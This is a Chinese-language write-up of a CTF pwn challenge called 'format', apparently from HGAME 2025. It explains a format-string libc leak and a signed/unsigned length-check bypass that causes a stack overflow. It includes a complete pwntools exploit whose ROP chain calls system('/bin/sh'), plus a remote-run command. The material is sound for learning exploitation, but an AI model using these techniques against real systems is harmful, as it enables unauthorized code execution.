# format

## 题目简述

程序把用户输入直接交给 `printf`，形成格式化字符串漏洞；后续输入长度检查又混用了有符号数和无符号数，输入负数可以绕过上限并触发栈溢出。原解法先利用连续 `%s` 读取寄存器和相邻内存中的指针，恢复 libc 基址，再利用负数长度覆盖返回地址，执行 `system("/bin/sh")`。

## 解题过程

### 1. 利用残留的 `rsi` 连续泄露

在 AMD64 System V 调用约定中，`printf` 的第二个参数通常位于 `rsi`。程序调用 `printf` 输出用户内容后，相关指针仍可能残留在寄存器中，而目标缓冲区又不保证在预期位置存在 `\0` 终止符。

格式串 `%sX` 会把 `rsi` 指向的内容作为字符串打印，并追加分隔字符 `X`。题解选择 `n=3699`，连续发送 3698 次 `%sX`，最后再发送一次 `%s`，让输出不断越过短字符串边界，直到带出映射区中的地址。读取固定长度输出后，末尾 6 字节可还原为 64 位小端指针：

```python
leak = u64(blob[-6:].ljust(8, b"\0"))
libc_base = leak & ~0xFFF
```

该样本泄露到的值位于 libc 映射起始页，因此按页对齐即可得到基址。这一假设依赖题目给定的二进制与 libc；更换附件时应在调试器中核对泄露对象，而不能盲目套用页对齐。

### 2. 用负数绕过长度检查

第二个缺陷位于 `n` 的检查和实际读入长度之间。检查按有符号整数判断上限，而真正传给读取函数时发生无符号转换；输入 `-1` 后，逻辑上的“小于上限”成立，转换后的长度却变成极大的正数，于是可向小栈缓冲区写入任意长数据。

根据 PDF 中的栈布局，先填充 5 字节，再覆盖一个 8 字节槽位，随后放置 ROP：

```text
pop rdi ; ret
"/bin/sh"
ret
system
```

`pop rdi + 1` 正好落到该 gadget 末尾的 `ret`，用于栈对齐。

### 3. 整理后的 exploit

```python
#!/usr/bin/env python3
from pwn import *

context.binary = elf = ELF("./vuln", checksec=False)
libc = elf.libc
context.arch = "amd64"


def start():
    if args.REMOTE:
        return remote(args.HOST, int(args.PORT))
    return process(elf.path)


io = start()

# 连续触发非终止字符串读取，直到泄露出 libc 指针。
io.sendlineafter(b"n = ", b"3699")
for _ in range(3698):
    io.sendlineafter(b"type something:", b"%sX")
io.sendlineafter(b"type something:", b"%s")

blob = io.recvn(3808)
leak = u64(blob[-6:].ljust(8, b"\0"))
libc.address = leak & ~0xFFF
log.success(f"leak: {leak:#x}")
log.success(f"libc base: {libc.address:#x}")

pop_rdi = libc.address + 0x2A3E5
bin_sh = next(libc.search(b"/bin/sh\0"))
system = libc.sym["system"]

# 有符号/无符号转换绕过，随后覆盖保存的返回地址。
io.sendlineafter(b"n = ", b"-1")
payload = flat(
    b"\0" * 5,
    p64(0),
    p64(pop_rdi),
    p64(bin_sh),
    p64(pop_rdi + 1),
    p64(system),
)
io.send(payload)
io.interactive()
```

运行远程模式时显式提供地址：

```bash
python3 solve.py REMOTE HOST=challenge.example PORT=12345
```

原 PDF 没有保存最终 flag，当前仓库也没有对应二进制，因而无法对偏移做动态复验。公开选手题解给出了另一条更稳定的路线：先用 `%p` 泄露栈地址，再栈迁移并用 `%9$p` 泄露 libc，最后回到易溢出函数布置 ROP。两种方法利用的是同一组漏洞，参考页面已把关键步骤写明：[HGAME 2025 Week 1 Writeup](https://summ2.link/categories/CTF/hgame-2025-week1-wp/)。

## 方法总结

本题并非只有一个格式化字符串漏洞。格式串负责信息泄露，整数符号转换负责扩大写入长度，栈溢出负责最终控制流劫持。原 PDF 的连续 `%s` 方法依赖具体寄存器残留和输出长度，复现时应先在本地确认；若不稳定，可改用带位置参数的 `%p` 泄露，再结合栈迁移。无论采用哪条路线，都必须使用题目配套 libc 重新确认符号与 gadget 偏移。
